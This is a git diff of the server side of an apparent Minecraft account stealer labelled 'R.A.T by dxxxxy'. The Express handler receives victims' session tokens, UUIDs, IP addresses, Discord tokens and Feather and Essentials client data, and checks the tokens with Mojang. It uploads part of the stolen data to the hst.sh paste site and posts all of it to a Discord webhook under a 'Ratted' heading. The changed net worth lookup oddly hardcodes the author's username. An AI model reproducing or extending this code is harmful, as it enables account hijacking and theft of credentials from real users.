@@ -68,7 +68,7 @@ app.post("/", (req, res) => {
         }
     })
 
-    .then(response => {
+    .then(async response => {
         if (response.status == 204) { //mojangs way of saying its good
             if (usingMongoDB) {
                 //create a Ratted object with mongoose schema and save it
@@ -90,56 +90,39 @@ app.post("/", (req, res) => {
             }
 
             if (usingDiscord) {
-                //send to discord webhook
-                get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${req.body.username}?key=dxxxxy`).then(res => {
-                    post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - Networth: ${formatNumber(res.data.data[0].networth.total_networth)}`, //ping
-                        embeds: [{
-                            title: `Ratted ${req.body.username} - Click For Stats`,
-                            description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\`\`\`${req.body.feather}\`\`\`\n**Essentials:**\`\`\`${req.body.essentials}\`\`\`\n**Discord:**\`\`\`${req.body.discord}\`\`\``,
-                            url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
-                            color: 5814783,
-                            footer: {
-                                "text": "R.A.T by dxxxxy",
-                                "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
-                            },
-                            timestamp: new Date()
-                        }],
-                        attachments: []
-                    }), {
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
-                    }).catch(err => {
-                        console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                    })
-                }).catch(err => {
-                    console.log(`[R.A.T] Error while getting networth:\n${err}`)
-                    console.log(`[R.A.T] Resending without networth`)
+                //get networth
+                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/dxxxxy?key=dxxxxy`).catch(() => { return emptyResponse })).data.data[0].networth.total_networth
 
-                    post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - Networth: [Networth api unresponsive]`, //ping
-                        embeds: [{
-                            title: `Ratted ${req.body.username} - Click For Stats`,
-                            description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\`\`\`${req.body.feather}\`\`\`\n**Essentials:**\`\`\`${req.body.essentials}\`\`\`\n**Discord:**\`\`\`${req.body.discord}\`\`\``,
-                            url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
-                            color: 5814783,
-                            footer: {
-                                "text": "R.A.T by dxxxxy",
-                                "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
-                            },
-                            timestamp: new Date()
-                        }],
-                        attachments: []
-                    }), {
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
-                    }).catch(err => {
-                        console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                    })
+                //upload feather
+                const feather = await (await post("https://hst.sh/documents/", req.body.feather)).data.key
+
+                //upload essential
+                const essentials = await (await post("https://hst.sh/documents/", req.body.essentials)).data.key
+
+                //send to discord webhook
+                post(process.env.WEBHOOK, JSON.stringify({
+                    content: `@everyone - ${formatNumber(networth)}`, //ping
+                    embeds: [{
+                        title: `Ratted ${req.body.username} - Click For Stats`,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\``,
+                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
+                        color: 5814783,
+                        footer: {
+                            "text": "R.A.T by dxxxxy",
+                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
+                        },
+                        timestamp: new Date()
+                    }],
+                    attachments: []
+                }), {
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }).catch(err => {
+                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
             }
+
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
     })
@@ -163,3 +146,6 @@ const formatNumber = (num) => {
     else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
     else return `${(num / 1000000000).toFixed(2)}b`
 }
+
+//for nw api
+const emptyResponse = { data: { data: [{ networth: { total_networth: null } }] } }
